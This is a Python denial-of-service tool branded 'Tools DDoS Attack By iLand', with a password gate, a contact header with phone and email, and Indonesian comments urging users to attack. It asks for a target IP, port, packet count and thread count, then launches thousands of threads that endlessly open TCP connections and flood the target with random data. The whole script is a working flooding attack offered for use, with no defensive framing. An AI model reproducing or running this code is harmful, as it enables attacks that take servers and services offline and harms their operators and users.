#===================================
#[+] Whatsapp : +62 857 0569 3465
#[+] Email    : loskienope@gmail.com
#[+] Discord  : iLand#2223
#[+] YouTube  : King Neys
#[+] FaceBook : iLand GTPS
#===================================

#Credit Tools RDP-exe.py : NumeX
import random
import socket
import threading
import os, sys
import time
import logging
import sysconfig
import colorsys

# DDOS AJA GAS SUDAH SELAMA MASIH BISA TEMBUS GAS KEUN AJA :)
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Tools DDoS Attack By iLand [ What Is Password ]")
print("==========================================================")
print("██╗██╗      █████╗ ███╗   ██╗██████╗     ██╗   ██╗██████╗ ")
print("██║██║     ██╔══██╗████╗  ██║██╔══██╗    ██║   ██║╚════██╗")
print("██║██║     ███████║██╔██╗ ██║██║  ██║    ██║   ██║ █████╔╝")
print("██║██║     ██╔══██║██║╚██╗██║██║  ██║    ╚██╗ ██╔╝██╔═══╝ ")
print("██║███████╗██║  ██║██║ ╚████║██████╔╝     ╚████╔╝ ███████╗")
print("╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝       ╚═══╝  ╚══════╝")
print("                                                          ")
print("==========================================================")
password = input("[~>] Password Tools: ")
if password == 'iLandDDoSV2':
        print("[~>] Password Is Valid")
        time.sleep(2)
else :
	print("[~>] Password Is Invalid")
	time.sleep(100000000000000000000000000000)

os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Tools DDoS Attack By iLand [ DDoS Attack ]")
print("==========================================================")
print("██╗██╗      █████╗ ███╗   ██╗██████╗     ██╗   ██╗██████╗ ")
print("██║██║     ██╔══██╗████╗  ██║██╔══██╗    ██║   ██║╚════██╗")
print("██║██║     ███████║██╔██╗ ██║██║  ██║    ██║   ██║ █████╔╝")
print("██║██║     ██╔══██║██║╚██╗██║██║  ██║    ╚██╗ ██╔╝██╔═══╝ ")
print("██║███████╗██║  ██║██║ ╚████║██████╔╝     ╚████╔╝ ███████╗")
print("╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝       ╚═══╝  ╚══════╝")
print("                                                          ")            
print("==========================================================")
print("[*] Tools Usage By iLand : iLand")
print("[*] Tools Remake/Coded By: iLand")
print("[*] Tools DDoS Credit By : KIPAS")
print("[*] Don't Leak Your Tools And Don't Abuse")
print("==========================================================")
ip = str(input("[+] Enter RDP IP iLand      : "))
port = int(input("[+] Enter RDP Port [80]     : "))
method_attack = str(input("[+] Enter Method [1/2]      : "))
times = int(input("[+] Enter Packet [60000]    : "))
threads = int(input("[+] Enter Thread [9024]     : "))
#Jika Ingin Attack 80 Packet & Thread Harus Sama Jika, Tidak Tembus Wajar Tools Noob :)

def run():
    data = random._urandom(9024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!] Attacking IP => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()